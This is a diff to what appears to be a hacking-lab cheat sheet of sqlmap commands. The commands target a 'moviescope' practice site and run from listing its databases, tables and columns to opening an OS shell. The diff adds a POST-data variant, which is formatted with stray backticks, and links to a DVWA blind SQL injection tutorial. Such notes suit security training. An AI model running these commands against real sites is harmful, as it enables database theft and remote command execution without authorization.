@@ -4,6 +4,7 @@
 
 * SQLMAP Extract DBS
   * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="xookies xxx" --dbs`
+  * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="xookies xxx" --data="id=1&Submit=Submit"``--dbs`
 * Extract Tables
   * `sqlmap -u “`[`http://www.example.com/viewprofile.aspx?id=1”`](http://www.moviescope.com/viewprofile.aspx?id=1%E2%80%9D) `--cookie="cookies xxx" -D moviescope --tables`
 * Extract Columns
@@ -42,3 +43,13 @@
 * **sqlmap -u "**[**http://www.moviescope.com/viewprofile.aspx?id=1**](http://www.moviescope.com/viewprofile.aspx?id=1)**" --cookie="value" --os-shell**
 * Get the OS Shell
 * TASKLIST
+
+
+
+
+
+### Additional Resources
+
+{% embed url="https://medium.com/hacker-toolbelt/dvwa-1-9-viii-blind-sql-injection-with-sqlmap-ee8d59fbdea7" %}
+
+[https://www.youtube.com/watch?v=IR1JsaSQLMc](https://www.youtube.com/watch?v=IR1JsaSQLMc)
